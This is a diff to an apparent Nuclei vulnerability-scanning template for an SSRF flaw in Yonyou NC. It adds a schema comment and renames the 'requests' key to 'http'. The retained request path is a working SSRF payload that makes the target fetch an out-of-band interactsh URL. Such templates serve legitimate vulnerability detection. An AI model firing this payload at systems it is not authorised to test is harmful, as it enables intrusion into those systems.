@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yongyou-ssrf
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: high
   tags: yongyou,ssrf
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/uapws/service/nc.pubitf.rbac.IUserPubServiceWS?xsd=http://{{interactsh-url}}"
